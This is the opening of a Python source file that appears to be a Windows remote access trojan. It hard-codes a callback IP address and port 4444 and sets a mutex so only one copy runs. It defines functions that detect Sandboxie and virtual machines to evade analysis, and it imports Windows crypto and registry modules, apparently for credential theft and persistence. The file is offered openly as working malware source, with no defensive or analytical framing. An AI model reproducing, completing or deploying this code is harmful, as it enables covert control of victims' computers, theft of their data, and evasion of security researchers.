# need install python packages before running code
# python -m pip install pywin32 pyscreeze

import socket, os, sys, platform, time, ctypes, subprocess, threading, wmi

import win32api, winerror, win32event, win32crypt

from winreg import *

strHost = "192.168.0.98"
intPort = 4444

strPath = os.path.realpath(sys.argv[0])
TMP = os.environ['APPDATA']

intBuff = 1024
#only one single thread - prevent multiple instances
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXIST:
    mutex = None
    sys.exit(0)


def detectSandboxie():
    try:
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")

        return " (Sandboxie) "

    except: return ""

def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select *  from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""